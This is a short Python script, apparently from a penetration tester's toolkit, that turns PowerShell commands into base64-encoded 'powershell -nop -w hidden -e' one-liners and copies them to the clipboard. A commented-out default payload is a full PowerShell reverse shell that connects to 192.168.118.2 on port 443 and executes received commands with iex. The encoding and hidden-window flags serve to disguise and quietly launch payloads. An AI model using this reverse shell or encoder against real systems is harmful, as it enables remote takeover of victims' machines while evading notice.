#!/usr/bin/env python3

# Description:
# 	Powershell base64 encoder written in python. You can give a file as argument, and
#   it converts to an encoded PS command, or without argument, just paste it or write it,
#   when the script prompts.
# Dependencies:
# 	xclip,python3
# Short description: pse | Powershell base64 encoder written in python.

from datetime import datetime
import sys
import base64
import os


if len(sys.argv) == 2:
    myfile = sys.argv[1]
    with open(myfile, "r") as f:
        payload = f.read()
    print(f"[*] Payload read from file: {myfile}")
else:
    #payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    print("[!] No file given as argument.")
    payload = input("[+] Please provide powershell command: ")

print(f"\n[*] Original payload: {payload}\n")

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

now = datetime.strftime(datetime.now(), "%m%d_%H%M%S")
command_file = f"ps_command_{now}.txt"
with open(command_file, "w") as cf:
    cf.write(cmd)
    cf.flush()

os.system(f'echo {cmd} | xclip -sel clip')

print(f"[!] Encoded ps command copied to clipboard, and saved to file: {command_file}\n")
print(cmd)